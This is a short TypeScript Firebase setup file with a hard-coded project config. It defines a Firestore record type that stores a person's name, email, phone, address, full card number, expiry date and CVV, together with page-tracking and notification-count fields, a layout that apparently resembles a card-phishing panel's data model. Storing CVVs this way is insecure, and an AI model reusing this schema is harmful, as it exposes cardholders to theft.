import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyDIUeFAbjrL265u-8WjQKC17QKUs530BKg",
  authDomain: "kw-new-59cb9.firebaseapp.com",
  projectId: "kw-new-59cb9",
  storageBucket: "kw-new-59cb9.firebasestorage.app",
  messagingSenderId: "1004892216777",
  appId: "1:1004892216777:web:a86f1e237001b5a0a15c18",
  measurementId: "G-5PWR9E9PV8"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
